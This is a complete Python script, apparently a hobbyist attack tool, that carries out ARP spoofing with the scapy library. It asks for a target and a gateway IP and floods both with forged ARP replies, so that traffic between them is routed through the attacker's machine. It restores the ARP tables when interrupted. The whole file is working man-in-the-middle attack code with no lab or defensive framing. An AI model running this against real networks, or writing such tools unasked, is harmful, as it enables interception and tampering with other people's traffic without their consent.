#!/usr/bin/env/ python3

import subprocess as sub_proc
import scapy.all as scapy
import time

sub_proc.call("clear", shell=True)
sub_proc.call("figlet ARP spoof | lolcat", shell=True)

target_ip = input("[ ] Target IP: ")
gateway_ip = input("[ ] Gateway IP: ")

def get_mac(ip):
	arpRequest = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast/arpRequest

	answered_list = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
	
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    scapy.send(packet, count=4, verbose=False)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)

        sent_packets_count += 2
        print("\r" + "\033[0;32;40m[+]" + "Packets sent: " + str(sent_packets_count), end="")

        time.sleep(1)
except KeyboardInterrupt:
    print("\n" + "\033[0;32;40m[+]" + "Detected CTRL + C ..... Resetting ARP tables ..... Please wait")
    
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
